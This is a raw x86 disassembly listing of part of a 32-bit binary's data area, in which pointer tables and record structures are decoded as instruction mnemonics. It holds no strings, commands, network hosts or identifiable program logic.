  4016c2:	03 00                	add    (%eax),%eax
  4016c4:	10 a3 03 00 08 a3    	adc    %ah,-0x5cf7fffd(%ebx)
  4016ca:	03 00                	add    (%eax),%eax
  4016cc:	fe                   	(bad)
  4016cd:	a2 03 00 f6 a2       	mov    %al,0xa2f60003
  4016d2:	03 00                	add    (%eax),%eax
  4016d4:	12 a2 03 00 e4 a2    	adc    -0x5d1bfffd(%edx),%ah
  4016da:	03 00                	add    (%eax),%eax
  4016dc:	d8 a2 03 00 d0 a2    	fsubs  -0x5d2ffffd(%edx)
  4016e2:	03 00                	add    (%eax),%eax
  4016e4:	c4 a2 03 00 ba a2    	les    -0x5d45fffd(%edx),%esp
  4016ea:	03 00                	add    (%eax),%eax
  4016ec:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4016ed:	a2 03 00 9c a2       	mov    %al,0xa29c0003
  4016f2:	03 00                	add    (%eax),%eax
  4016f4:	92                   	xchg   %eax,%edx
  4016f5:	a2 03 00 86 a2       	mov    %al,0xa2860003
  4016fa:	03 00                	add    (%eax),%eax
  4016fc:	7c a2                	jl     0x4016a0
  4016fe:	03 00                	add    (%eax),%eax
  401700:	6a a2                	push   $0xffffffa2
  401702:	03 00                	add    (%eax),%eax
  401704:	62 a2 03 00 ec a2    	bound  %esp,-0x5d13fffd(%edx)
  40170a:	03 00                	add    (%eax),%eax
  40170c:	fc                   	cld
  40170d:	a1 03 00 58 a2       	mov    0xa2580003,%eax
  401712:	03 00                	add    (%eax),%eax
  401714:	4c                   	dec    %esp
  401715:	a2 03 00 44 a2       	mov    %al,0xa2440003
  40171a:	03 00                	add    (%eax),%eax
  40171c:	3a a2 03 00 30 a2    	cmp    -0x5dcffffd(%edx),%ah
  401722:	03 00                	add    (%eax),%eax
  401724:	26 a2 03 00 06 a2    	mov    %al,%es:0xa2060003
  40172a:	03 00                	add    (%eax),%eax
  40172c:	00 00                	add    %al,(%eax)
  40172e:	00 00                	add    %al,(%eax)
  401730:	d2 a8 03 00 c0 a8    	shrb   %cl,-0x573ffffd(%eax)
  401736:	03 00                	add    (%eax),%eax
  401738:	ac                   	lods   %ds:(%esi),%al
  401739:	a8 03                	test   $0x3,%al
  40173b:	00 9c a8 03 00 8a a8 	add    %bl,-0x5775fffd(%eax,%ebp,4)
  401742:	03 00                	add    (%eax),%eax
  401744:	60                   	pusha
  401745:	a8 03                	test   $0x3,%al
  401747:	00 4e a8             	add    %cl,-0x58(%esi)
  40174a:	03 00                	add    (%eax),%eax
  40174c:	2c a8                	sub    $0xa8,%al
  40174e:	03 00                	add    (%eax),%eax
  401750:	18 a8 03 00 72 a8    	sbb    %ch,-0x578dfffd(%eax)
  401756:	03 00                	add    (%eax),%eax
  401758:	3c a8                	cmp    $0xa8,%al
  40175a:	03 00                	add    (%eax),%eax
	...
  401764:	e1 6f                	loope  0x4017d5
  401766:	f4                   	hlt
  401767:	68 00 00 00 00       	push   $0x0
  40176c:	02 00                	add    (%eax),%al
  40176e:	00 00                	add    %al,(%eax)
  401770:	1d 00 00 00 70       	sbb    $0x70000000,%eax
  401775:	78 00                	js     0x401777
  401777:	00 70 6c             	add    %dh,0x6c(%eax)
	...
  401796:	00 00                	add    %al,(%eax)
  401798:	c1 cb 42             	ror    $0x42,%ebx
  40179b:	00 80 17 40 00 11    	add    %al,0x11004017(%eax)
  4017a1:	01 00                	add    %eax,(%eax)
  4017a3:	00 00                	add    %al,(%eax)
  4017a5:	00 00                	add    %al,(%eax)
  4017a7:	00 96 13 00 00 96    	add    %dl,-0x69ffffed(%esi)
  4017ad:	13 00                	adc    (%eax),%eax
  4017af:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4017b2:	00 00                	add    %al,(%eax)
  4017b4:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4017b5:	ae                   	scas   %es:(%edi),%al
  4017b6:	40                   	inc    %eax
	...
  4017cf:	00 8a c4 40 00 a0    	add    %cl,-0x5fffbf3c(%edx)
  4017d5:	17                   	pop    %ss
  4017d6:	40                   	inc    %eax
  4017d7:	00 11                	add    %dl,(%ecx)
  4017d9:	01 00                	add    %eax,(%eax)
  4017db:	00 00                	add    %al,(%eax)
  4017dd:	00 00                	add    %al,(%eax)
  4017df:	00 20                	add    %ah,(%eax)
  4017e1:	27                   	daa
  4017e2:	00 00                	add    %al,(%eax)
  4017e4:	20 27                	and    %ah,(%edi)
  4017e6:	00 00                	add    %al,(%eax)
  4017e8:	0c 00                	or     $0x0,%al
  4017ea:	00 00                	add    %al,(%eax)
  4017ec:	38 d7                	cmp    %dl,%bh
  4017ee:	40                   	inc    %eax
  4017ef:	00 11                	add    %dl,(%ecx)
  4017f1:	01 00                	add    %eax,(%eax)
  4017f3:	00 00                	add    %al,(%eax)
  4017f5:	00 00                	add    %al,(%eax)
  4017f7:	00 21                	add    %ah,(%ecx)
  4017f9:	27                   	daa
  4017fa:	00 00                	add    %al,(%eax)
  4017fc:	21 27                	and    %esp,(%edi)
  4017fe:	00 00                	add    %al,(%eax)
  401800:	0c 00                	or     $0x0,%al
  401802:	00 00                	add    %al,(%eax)
  401804:	f8                   	clc
  401805:	d7                   	xlat   %ds:(%ebx)
  401806:	40                   	inc    %eax
  401807:	00 11                	add    %dl,(%ecx)
  401809:	01 00                	add    %eax,(%eax)
  40180b:	00 01                	add    %al,(%ecx)
  40180d:	00 00                	add    %al,(%eax)
  40180f:	00 92 13 00 00 92    	add    %dl,-0x6dffffed(%edx)
  401815:	13 00                	adc    (%eax),%eax
  401817:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40181a:	00 00                	add    %al,(%eax)
  40181c:	19 b2 40 00 11 01    	sbb    %esi,0x1110040(%edx)
  401822:	00 00                	add    %al,(%eax)
  401824:	00 03                	add    %al,(%ebx)
  401826:	00 00                	add    %al,(%eax)
  401828:	90                   	nop
  401829:	13 00                	adc    (%eax),%eax
  40182b:	00 90 13 00 00 0c    	add    %dl,0xc000013(%eax)
  401831:	00 00                	add    %al,(%eax)
  401833:	00 19                	add    %bl,(%ecx)
  401835:	b2 40                	mov    $0x40,%dl
	...
  40184f:	00 8a c4 40 00 d8    	add    %cl,-0x27ffbf3c(%edx)
  401855:	17                   	pop    %ss
  401856:	40                   	inc    %eax
  401857:	00 11                	add    %dl,(%ecx)
  401859:	01 00                	add    %eax,(%eax)
  40185b:	00 00                	add    %al,(%eax)
  40185d:	00 00                	add    %al,(%eax)
  40185f:	00 96 13 00 00 96    	add    %dl,-0x69ffffed(%esi)
  401865:	13 00                	adc    (%eax),%eax
  401867:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40186a:	00 00                	add    %al,(%eax)
  40186c:	d7                   	xlat   %ds:(%ebx)
  40186d:	b5 40                	mov    $0x40,%ch
	...
  401887:	00 8a c4 40 00 58    	add    %cl,0x580040c4(%edx)
  40188d:	18 40 00             	sbb    %al,0x0(%eax)
  401890:	11 01                	adc    %eax,(%ecx)
  401892:	00 00                	add    %al,(%eax)
  401894:	00 00                	add    %al,(%eax)
  401896:	00 00                	add    %al,(%eax)
  401898:	20 27                	and    %ah,(%edi)
  40189a:	00 00                	add    %al,(%eax)
  40189c:	20 27                	and    %ah,(%edi)
  40189e:	00 00                	add    %al,(%eax)
  4018a0:	0c 00                	or     $0x0,%al
  4018a2:	00 00                	add    %al,(%eax)
  4018a4:	b6 d9                	mov    $0xd9,%dh
  4018a6:	40                   	inc    %eax
  4018a7:	00 11                	add    %dl,(%ecx)
  4018a9:	01 00                	add    %eax,(%eax)
  4018ab:	00 00                	add    %al,(%eax)
  4018ad:	00 00                	add    %al,(%eax)
  4018af:	00 21                	add    %ah,(%ecx)
  4018b1:	27                   	daa
  4018b2:	00 00                	add    %al,(%eax)
  4018b4:	21 27                	and    %esp,(%edi)
  4018b6:	00 00                	add    %al,(%eax)
  4018b8:	0c 00                	or     $0x0,%al
  4018ba:	00 00                	add    %al,(%eax)
  4018bc:	b2 da                	mov    $0xda,%dl
  4018be:	40                   	inc    %eax
  4018bf:	00 11                	add    %dl,(%ecx)
  4018c1:	01 00                	add    %eax,(%eax)
  4018c3:	00 01                	add    %al,(%ecx)
  4018c5:	00 00                	add    %al,(%eax)
  4018c7:	00 92 13 00 00 92    	add    %dl,-0x6dffffed(%edx)
  4018cd:	13 00                	adc    (%eax),%eax
  4018cf:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4018d2:	00 00                	add    %al,(%eax)
  4018d4:	15 b8 40 00 11       	adc    $0x110040b8,%eax
  4018d9:	01 00                	add    %eax,(%eax)
  4018db:	00 00                	add    %al,(%eax)
  4018dd:	03 00                	add    (%eax),%eax
  4018df:	00 90 13 00 00 90    	add    %dl,-0x6fffffed(%eax)
  4018e5:	13 00                	adc    (%eax),%eax
  4018e7:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4018ea:	00 00                	add    %al,(%eax)
  4018ec:	15 b8 40 00 00       	adc    $0x40b8,%eax
	...
  401905:	00 00                	add    %al,(%eax)
  401907:	00 8a c4 40 00 90    	add    %cl,-0x6fffbf3c(%edx)
  40190d:	18 40 00             	sbb    %al,0x0(%eax)
  401910:	11 01                	adc    %eax,(%ecx)
  401912:	00 00                	add    %al,(%eax)
  401914:	00 00                	add    %al,(%eax)
  401916:	00 00                	add    %al,(%eax)
  401918:	96                   	xchg   %eax,%esi
  401919:	13 00                	adc    (%eax),%eax
  40191b:	00 96 13 00 00 0c    	add    %dl,0xc000013(%esi)
  401921:	00 00                	add    %al,(%eax)
  401923:	00 fc                	add    %bh,%ah
  401925:	ba 40 00 00 00       	mov    $0x40,%edx
	...
  40193e:	00 00                	add    %al,(%eax)
  401940:	8a c4                	mov    %ah,%al
  401942:	40                   	inc    %eax
  401943:	00 10                	add    %dl,(%eax)
  401945:	19 40 00             	sbb    %eax,0x0(%eax)
	...
  401960:	8a c4                	mov    %ah,%al
  401962:	40                   	inc    %eax
  401963:	00 48 19             	add    %cl,0x19(%eax)
  401966:	40                   	inc    %eax
  401967:	00 11                	add    %dl,(%ecx)
  401969:	01 00                	add    %eax,(%eax)
  40196b:	00 00                	add    %al,(%eax)
  40196d:	00 00                	add    %al,(%eax)
  40196f:	00 20                	add    %ah,(%eax)
  401971:	27                   	daa
  401972:	00 00                	add    %al,(%eax)
  401974:	20 27                	and    %ah,(%edi)
  401976:	00 00                	add    %al,(%eax)
  401978:	0c 00                	or     $0x0,%al
  40197a:	00 00                	add    %al,(%eax)
  40197c:	48                   	dec    %eax
  40197d:	dd 40 00             	fldl   0x0(%eax)
  401980:	11 01                	adc    %eax,(%ecx)
  401982:	00 00                	add    %al,(%eax)
  401984:	00 00                	add    %al,(%eax)
  401986:	00 00                	add    %al,(%eax)
  401988:	21 27                	and    %esp,(%edi)
  40198a:	00 00                	add    %al,(%eax)
  40198c:	21 27                	and    %esp,(%edi)
  40198e:	00 00                	add    %al,(%eax)
  401990:	0c 00                	or     $0x0,%al
  401992:	00 00                	add    %al,(%eax)
  401994:	ee                   	out    %al,(%dx)
  401995:	dd 40 00             	fldl   0x0(%eax)
  401998:	11 01                	adc    %eax,(%ecx)
  40199a:	00 00                	add    %al,(%eax)
  40199c:	01 00                	add    %eax,(%eax)
  40199e:	00 00                	add    %al,(%eax)
  4019a0:	92                   	xchg   %eax,%edx
  4019a1:	13 00                	adc    (%eax),%eax
  4019a3:	00 92 13 00 00 0c    	add    %dl,0xc000013(%edx)
  4019a9:	00 00                	add    %al,(%eax)
  4019ab:	00 6c bf 40          	add    %ch,0x40(%edi,%edi,4)
  4019af:	00 11                	add    %dl,(%ecx)
  4019b1:	01 00                	add    %eax,(%eax)
  4019b3:	00 00                	add    %al,(%eax)
  4019b5:	00 00                	add    %al,(%eax)
  4019b7:	00 72 17             	add    %dh,0x17(%edx)
  4019ba:	00 00                	add    %al,(%eax)
  4019bc:	72 17                	jb     0x4019d5
  4019be:	00 00                	add    %al,(%eax)
  4019c0:	0c 00                	or     $0x0,%al
  4019c2:	00 00                	add    %al,(%eax)
  4019c4:	6c                   	insb   (%dx),%es:(%edi)
  4019c5:	bf 40 00 11 01       	mov    $0x1110040,%edi
  4019ca:	00 00                	add    %al,(%eax)
  4019cc:	00 00                	add    %al,(%eax)
  4019ce:	00 00                	add    %al,(%eax)
  4019d0:	73 17                	jae    0x4019e9
  4019d2:	00 00                	add    %al,(%eax)
  4019d4:	73 17                	jae    0x4019ed
  4019d6:	00 00                	add    %al,(%eax)
  4019d8:	0c 00                	or     $0x0,%al
  4019da:	00 00                	add    %al,(%eax)
  4019dc:	6c                   	insb   (%dx),%es:(%edi)
  4019dd:	bf 40 00 00 00       	mov    $0x40,%edi
	...
  4019f6:	00 00                	add    %al,(%eax)
  4019f8:	8a c4                	mov    %ah,%al
  4019fa:	40                   	inc    %eax
  4019fb:	00 68 19             	add    %ch,0x19(%eax)
  4019fe:	40                   	inc    %eax
	...
  401a17:	00 8a c4 40 00 00    	add    %cl,0x40c4(%edx)
  401a1d:	1a 40 00             	sbb    0x0(%eax),%al
  401a20:	11 01                	adc    %eax,(%ecx)
  401a22:	00 00                	add    %al,(%eax)
  401a24:	00 00                	add    %al,(%eax)
  401a26:	00 00                	add    %al,(%eax)
  401a28:	20 27                	and    %ah,(%edi)
  401a2a:	00 00                	add    %al,(%eax)
  401a2c:	20 27                	and    %ah,(%edi)
  401a2e:	00 00                	add    %al,(%eax)
  401a30:	0c 00                	or     $0x0,%al
  401a32:	00 00                	add    %al,(%eax)
  401a34:	2e e1 40             	loope,pn 0x401a77
  401a37:	00 11                	add    %dl,(%ecx)
  401a39:	01 00                	add    %eax,(%eax)
  401a3b:	00 00                	add    %al,(%eax)
  401a3d:	00 00                	add    %al,(%eax)
  401a3f:	00 21                	add    %ah,(%ecx)
  401a41:	27                   	daa
  401a42:	00 00                	add    %al,(%eax)
  401a44:	21 27                	and    %esp,(%edi)
  401a46:	00 00                	add    %al,(%eax)
  401a48:	0c 00                	or     $0x0,%al
  401a4a:	00 00                	add    %al,(%eax)
  401a4c:	5a                   	pop    %edx
  401a4d:	e2 40                	loop   0x401a8f
  401a4f:	00 11                	add    %dl,(%ecx)
  401a51:	01 00                	add    %eax,(%eax)
  401a53:	00 01                	add    %al,(%ecx)
  401a55:	00 00                	add    %al,(%eax)
  401a57:	00 92 13 00 00 92    	add    %dl,-0x6dffffed(%edx)
  401a5d:	13 00                	adc    (%eax),%eax
  401a5f:	00 0c 00             	add    %cl,(%eax,%eax,1)
  401a62:	00 00                	add    %al,(%eax)
  401a64:	4c                   	dec    %esp
  401a65:	c4 40 00             	les    0x0(%eax),%eax
	...
  401a80:	8a c4                	mov    %ah,%al
  401a82:	40                   	inc    %eax
  401a83:	00 20                	add    %ah,(%eax)
  401a85:	1a 40 00             	sbb    0x0(%eax),%al
  401a88:	11 01                	adc    %eax,(%ecx)
  401a8a:	00 00                	add    %al,(%eax)
  401a8c:	00 03                	add    %al,(%ebx)
  401a8e:	00 00                	add    %al,(%eax)
  401a90:	22 27                	and    (%edi),%ah
  401a92:	00 00                	add    %al,(%eax)
  401a94:	22 27                	and    (%edi),%ah
  401a96:	00 00                	add    %al,(%eax)
  401a98:	0c 00                	or     $0x0,%al
  401a9a:	00 00                	add    %al,(%eax)
  401a9c:	a0 c5 40 00 11       	mov    0x110040c5,%al
  401aa1:	01 00                	add    %eax,(%eax)
  401aa3:	00 00                	add    %al,(%eax)
  401aa5:	00 00                	add    %al,(%eax)
  401aa7:	00 1f                	add    %bl,(%edi)
  401aa9:	27                   	daa
  401aaa:	00 00                	add    %al,(%eax)
  401aac:	1f                   	pop    %ds
  401aad:	27                   	daa
  401aae:	00 00                	add    %al,(%eax)
  401ab0:	0c 00                	or     $0x0,%al
  401ab2:	00 00                	add    %al,(%eax)
  401ab4:	6e                   	outsb  %ds:(%esi),(%dx)
  401ab5:	c6 40 00 11          	movb   $0x11,0x0(%eax)
  401ab9:	01 00                	add    %eax,(%eax)
  401abb:	00 00                	add    %al,(%eax)
  401abd:	00 00                	add    %al,(%eax)
  401abf:	00 96 13 00 00 96    	add    %dl,-0x69ffffed(%esi)
  401ac5:	13 00                	adc    (%eax),%eax
  401ac7:	00 0c 00             	add    %cl,(%eax,%eax,1)
  401aca:	00 00                	add    %al,(%eax)
  401acc:	74 c9                	je     0x401a97
  401ace:	40                   	inc    %eax
	...
  401ae7:	00 8a c4 40 00 88    	add    %cl,-0x77ffbf3c(%edx)
  401aed:	1a 40 00             	sbb    0x0(%eax),%al
  401af0:	11 01                	adc    %eax,(%ecx)
  401af2:	00 00                	add    %al,(%eax)
  401af4:	00 00                	add    %al,(%eax)
  401af6:	00 00                	add    %al,(%eax)
  401af8:	20 27                	and    %ah,(%edi)
  401afa:	00 00                	add    %al,(%eax)
  401afc:	20 27                	and    %ah,(%edi)
  401afe:	00 00                	add    %al,(%eax)
  401b00:	0c 00                	or     $0x0,%al
  401b02:	00 00                	add    %al,(%eax)
  401b04:	33 e7                	xor    %edi,%esp
  401b06:	40                   	inc    %eax
  401b07:	00 11                	add    %dl,(%ecx)
  401b09:	01 00                	add    %eax,(%eax)
  401b0b:	00 00                	add    %al,(%eax)
  401b0d:	00 00                	add    %al,(%eax)
  401b0f:	00 21                	add    %ah,(%ecx)
  401b11:	27                   	daa
  401b12:	00 00                	add    %al,(%eax)
  401b14:	21 27                	and    %esp,(%edi)
  401b16:	00 00                	add    %al,(%eax)
  401b18:	0c 00                	or     $0x0,%al
  401b1a:	00 00                	add    %al,(%eax)
  401b1c:	f3 e6 40             	repz out %al,$0x40
  401b1f:	00 11                	add    %dl,(%ecx)
  401b21:	01 00                	add    %eax,(%eax)
  401b23:	00 00                	add    %al,(%eax)
  401b25:	00 00                	add    %al,(%eax)
  401b27:	00 30                	add    %dh,(%eax)
  401b29:	04 00                	add    $0x0,%al
  401b2b:	00 30                	add    %dh,(%eax)
  401b2d:	04 00                	add    $0x0,%al
  401b2f:	00 0c 00             	add    %cl,(%eax,%eax,1)
  401b32:	00 00                	add    %al,(%eax)
  401b34:	4a                   	dec    %edx
  401b35:	e5 40                	in     $0x40,%eax
  401b37:	00 11                	add    %dl,(%ecx)
  401b39:	01 00                	add    %eax,(%eax)
  401b3b:	00 01                	add    %al,(%ecx)
  401b3d:	00 00                	add    %al,(%eax)
  401b3f:	00 92 13 00 00 92    	add    %dl,-0x6dffffed(%edx)
  401b45:	13 00                	adc    (%eax),%eax
  401b47:	00 0c 00             	add    %cl,(%eax,%eax,1)
  401b4a:	00 00                	add    %al,(%eax)
  401b4c:	49                   	dec    %ecx
  401b4d:	cb                   	lret
  401b4e:	40                   	inc    %eax
	...
  401b67:	00 8a c4 40 00 f0    	add    %cl,-0xfffbf3c(%edx)
  401b6d:	1a 40 00             	sbb    0x0(%eax),%al
  401b70:	11 01                	adc    %eax,(%ecx)
  401b72:	00 00                	add    %al,(%eax)
  401b74:	00 00                	add    %al,(%eax)
  401b76:	00 00                	add    %al,(%eax)
  401b78:	96                   	xchg   %eax,%esi
  401b79:	13 00                	adc    (%eax),%eax
  401b7b:	00 96 13 00 00 0c    	add    %dl,0xc000013(%esi)
  401b81:	00 00                	add    %al,(%eax)
  401b83:	00 13                	add    %dl,(%ebx)
  401b85:	cc                   	int3
  401b86:	40                   	inc    %eax
	...
  401b9f:	00 8a c4 40 00 70    	add    %cl,0x700040c4(%edx)
  401ba5:	1b 40 00             	sbb    0x0(%eax),%eax
  401ba8:	11 01                	adc    %eax,(%ecx)
  401baa:	00 00                	add    %al,(%eax)
  401bac:	00 00                	add    %al,(%eax)
  401bae:	00 00                	add    %al,(%eax)
  401bb0:	8a 13                	mov    (%ebx),%dl
  401bb2:	00 00                	add    %al,(%eax)
  401bb4:	8a 13                	mov    (%ebx),%dl
  401bb6:	00 00                	add    %al,(%eax)
  401bb8:	0c 00                	or     $0x0,%al
  401bba:	00 00                	add    %al,(%eax)
  401bbc:	5f                   	pop    %edi
  401bbd:	f3 40                	repz inc %eax
  401bbf:	00 11                	add    %dl,(%ecx)
  401bc1:	01 00                	add    %eax,(%eax)
  401bc3:	00 00                	add    %al,(%eax)
  401bc5:	00 00                	add    %al,(%eax)
  401bc7:	00 8b 13 00 00 8b    	add    %cl,-0x74ffffed(%ebx)
  401bcd:	13 00                	adc    (%eax),%eax
  401bcf:	00 0c 00             	add    %cl,(%eax,%eax,1)
  401bd2:	00 00                	add    %al,(%eax)
  401bd4:	b6 f3                	mov    $0xf3,%dh
  401bd6:	40                   	inc    %eax
  401bd7:	00 11                	add    %dl,(%ecx)
  401bd9:	01 00                	add    %eax,(%eax)
  401bdb:	00 00                	add    %al,(%eax)
  401bdd:	00 00                	add    %al,(%eax)
  401bdf:	00 8c 13 00 00 8c 13 	add    %cl,0x138c0000(%ebx,%edx,1)
  401be6:	00 00                	add    %al,(%eax)
  401be8:	0c 00                	or     $0x0,%al
  401bea:	00 00                	add    %al,(%eax)
  401bec:	0d f4 40 00 11       	or     $0x110040f4,%eax
  401bf1:	01 00                	add    %eax,(%eax)
  401bf3:	00 00                	add    %al,(%eax)
  401bf5:	00 00                	add    %al,(%eax)
  401bf7:	00 1f                	add    %bl,(%edi)
  401bf9:	27                   	daa
  401bfa:	00 00                	add    %al,(%eax)
  401bfc:	1f                   	pop    %ds
  401bfd:	27                   	daa
  401bfe:	00 00                	add    %al,(%eax)
  401c00:	0c 00                	or     $0x0,%al
  401c02:	00 00                	add    %al,(%eax)
  401c04:	b1 06                	mov    $0x6,%cl
  401c06:	41                   	inc    %ecx
  401c07:	00 01                	add    %al,(%ecx)
	...
  401c15:	00 00                	add    %al,(%eax)
  401c17:	00 09                	add    %cl,(%ecx)
  401c19:	00 00                	add    %al,(%eax)
  401c1b:	00 27                	add    %ah,(%edi)
  401c1d:	d3 40 00             	roll   %cl,0x0(%eax)
  401c20:	02 00                	add    (%eax),%al
	...
  401c2e:	00 00                	add    %al,(%eax)
  401c30:	0c 00                	or     $0x0,%al
  401c32:	00 00                	add    %al,(%eax)
  401c34:	2f                   	das
  401c35:	d3 40 00             	roll   %cl,0x0(%eax)
  401c38:	4e                   	dec    %esi
  401c39:	00 00                	add    %al,(%eax)
  401c3b:	00 8e ff 00 00 8e    	add    %cl,-0x71ffff01(%esi)
  401c41:	13 00                	adc    (%eax),%eax
  401c43:	00 8e 13 00 00 26    	add    %cl,0x26000013(%esi)
  401c49:	00 00                	add    %al,(%eax)
  401c4b:	00 72 06             	add    %dh,0x6(%edx)
  401c4e:	41                   	inc    %ecx
  401c4f:	00 4e 00             	add    %cl,0x0(%esi)
  401c52:	00 00                	add    %al,(%eax)
  401c54:	9b                   	fwait
  401c55:	ff 00                	incl   (%eax)
  401c57:	00 8e 13 00 00 8e    	add    %cl,-0x71ffffed(%esi)
  401c5d:	13 00                	adc    (%eax),%eax
  401c5f:	00 26                	add    %ah,(%esi)
  401c61:	00 00                	add    %al,(%eax)
  401c63:	00 b4 eb 40 00 4e 00 	add    %dh,0x4e0040(%ebx,%ebp,8)
  401c6a:	00 00                	add    %al,(%eax)
  401c6c:	94                   	xchg   %eax,%esp
  401c6d:	ff 00                	incl   (%eax)
  401c6f:	00 8e 13 00 00 8e    	add    %cl,-0x71ffffed(%esi)
  401c75:	13 00                	adc    (%eax),%eax
  401c77:	00 26                	add    %ah,(%esi)
  401c79:	00 00                	add    %al,(%eax)
  401c7b:	00 04 d0             	add    %al,(%eax,%edx,8)
  401c7e:	40                   	inc    %eax
	...
  401c97:	00 1e                	add    %bl,(%esi)
  401c99:	b3 41                	mov    $0x41,%bl
  401c9b:	00 a8 1b 40 00 2f    	add    %ch,0x2f00401b(%eax)
  401ca1:	00 00                	add    %al,(%eax)
  401ca3:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  401ca7:	00 c0                	add    %al,%al
  401ca9:	78 40                	js     0x401ceb
  401cab:	00 16                	add    %dl,(%esi)
  401cad:	05 43 00 37 d3       	add    $0xd3370043,%eax
  401cb2:	40                   	inc    %eax
  401cb3:	00 94 60 41 00 30 44 	add    %dl,0x44300041(%eax,%eiz,2)
  401cba:	41                   	inc    %ecx
  401cbb:	00 94 60 41 00 5c 79 	add    %dl,0x795c0041(%eax,%eiz,2)
  401cc2:	40                   	inc    %eax
  401cc3:	00 3c 06             	add    %bh,(%esi,%eax,1)
  401cc6:	43                   	inc    %ebx
  401cc7:	00 ce                	add    %cl,%dh
  401cc9:	a9 40 00 94 60       	test   $0x60940040,%eax
  401cce:	41                   	inc    %ecx
  401ccf:	00 30                	add    %dh,(%eax)
  401cd1:	44                   	inc    %esp
  401cd2:	41                   	inc    %ecx
  401cd3:	00 94 60 41 00 36 06 	add    %dl,0x6360041(%eax,%eiz,2)
  401cda:	43                   	inc    %ebx
  401cdb:	00 30                	add    %dh,(%eax)
  401cdd:	06                   	push   %es
  401cde:	43                   	inc    %ebx
  401cdf:	00 2a                	add    %ch,(%edx)
  401ce1:	06                   	push   %es
  401ce2:	43                   	inc    %ebx
  401ce3:	00 24 06             	add    %ah,(%esi,%eax,1)
  401ce6:	43                   	inc    %ebx
  401ce7:	00 1e                	add    %bl,(%esi)
  401ce9:	06                   	push   %es
  401cea:	43                   	inc    %ebx
  401ceb:	00 18                	add    %bl,(%eax)
  401ced:	06                   	push   %es
  401cee:	43                   	inc    %ebx
  401cef:	00 12                	add    %dl,(%edx)
  401cf1:	06                   	push   %es
  401cf2:	43                   	inc    %ebx
  401cf3:	00 e5                	add    %ah,%ch
  401cf5:	77 41                	ja     0x401d38
  401cf7:	00 0c 06             	add    %cl,(%esi,%eax,1)
  401cfa:	43                   	inc    %ebx
  401cfb:	00 06                	add    %al,(%esi)
  401cfd:	06                   	push   %es
  401cfe:	43                   	inc    %ebx
  401cff:	00 00                	add    %al,(%eax)
  401d01:	06                   	push   %es
  401d02:	43                   	inc    %ebx
  401d03:	00 fa                	add    %bh,%dl
  401d05:	05 43 00 f4 05       	add    $0x5f40043,%eax
  401d0a:	43                   	inc    %ebx
  401d0b:	00 ee                	add    %ch,%dh
  401d0d:	05 43 00 e8 05       	add    $0x5e80043,%eax
  401d12:	43                   	inc    %ebx
  401d13:	00 e2                	add    %ah,%dl
  401d15:	05 43 00 dc 05       	add    $0x5dc0043,%eax
  401d1a:	43                   	inc    %ebx
  401d1b:	00 d6                	add    %dl,%dh
  401d1d:	05 43 00 d0 05       	add    $0x5d00043,%eax
  401d22:	43                   	inc    %ebx
  401d23:	00 ca                	add    %cl,%dl
  401d25:	05 43 00 c4 05       	add    $0x5c40043,%eax
  401d2a:	43                   	inc    %ebx
  401d2b:	00 be 05 43 00 b8    	add    %bh,-0x47ffbcfb(%esi)
  401d31:	05 43 00 b2 05       	add    $0x5b20043,%eax
  401d36:	43                   	inc    %ebx
  401d37:	00 ac 05 43 00 a6 05 	add    %ch,0x5a60043(%ebp,%eax,1)
  401d3e:	43                   	inc    %ebx
  401d3f:	00 a0 05 43 00 9a    	add    %ah,-0x65ffbcfb(%eax)
  401d45:	05 43 00 94 05       	add    $0x5940043,%eax
  401d4a:	43                   	inc    %ebx
  401d4b:	00 8e 05 43 00 94    	add    %cl,-0x6bffbcfb(%esi)
  401d51:	60                   	pusha
  401d52:	41                   	inc    %ecx
  401d53:	00 88 a9 40 00 94    	add    %cl,-0x6bffbf57(%eax)
  401d59:	a9 40 00 88 05       	test   $0x5880040,%eax
  401d5e:	43                   	inc    %ebx
  401d5f:	00 82 05 43 00 7c    	add    %al,0x7c004305(%edx)
  401d65:	05 43 00 76 05       	add    $0x5760043,%eax
  401d6a:	43                   	inc    %ebx
  401d6b:	00 70 05             	add    %dh,0x5(%eax)
  401d6e:	43                   	inc    %ebx
  401d6f:	00 6a 05             	add    %ch,0x5(%edx)
  401d72:	43                   	inc    %ebx
  401d73:	00 64 05 43          	add    %ah,0x43(%ebp,%eax,1)
  401d77:	00 5e 05             	add    %bl,0x5(%esi)
  401d7a:	43                   	inc    %ebx
  401d7b:	00 58 05             	add    %bl,0x5(%eax)
  401d7e:	43                   	inc    %ebx
  401d7f:	00 52 05             	add    %dl,0x5(%edx)
  401d82:	43                   	inc    %ebx
  401d83:	00 4c 05 43          	add    %cl,0x43(%ebp,%eax,1)
  401d87:	00 46 05             	add    %al,0x5(%esi)
  401d8a:	43                   	inc    %ebx
  401d8b:	00 40 05             	add    %al,0x5(%eax)
  401d8e:	43                   	inc    %ebx
  401d8f:	00 3a                	add    %bh,(%edx)
  401d91:	05 43 00 00 00       	add    $0x43,%eax
  401d96:	00 00                	add    %al,(%eax)
  401d98:	c8 79 40 00          	enter  $0x4079,$0x0
  401d9c:	a8 06                	test   $0x6,%al
  401d9e:	43                   	inc    %ebx
  401d9f:	00 c2                	add    %al,%dl
  401da1:	aa                   	stos   %al,%es:(%edi)
  401da2:	40                   	inc    %eax
  401da3:	00 94 60 41 00 30 44 	add    %dl,0x44300041(%eax,%eiz,2)
  401daa:	41                   	inc    %ecx
  401dab:	00 94 60 41 00 a2 06 	add    %dl,0x6a20041(%eax,%eiz,2)
  401db2:	43                   	inc    %ebx
  401db3:	00 30                	add    %dh,(%eax)
  401db5:	06                   	push   %es
  401db6:	43                   	inc    %ebx
  401db7:	00 2a                	add    %ch,(%edx)
  401db9:	06                   	push   %es
  401dba:	43                   	inc    %ebx
  401dbb:	00 24 06             	add    %ah,(%esi,%eax,1)
  401dbe:	43                   	inc    %ebx
  401dbf:	00 1e                	add    %bl,(%esi)
  401dc1:	06                   	push   %es
  401dc2:	43                   	inc    %ebx
  401dc3:	00 18                	add    %bl,(%eax)
  401dc5:	06                   	push   %es
  401dc6:	43                   	inc    %ebx
  401dc7:	00 12                	add    %dl,(%edx)
  401dc9:	06                   	push   %es
  401dca:	43                   	inc    %ebx
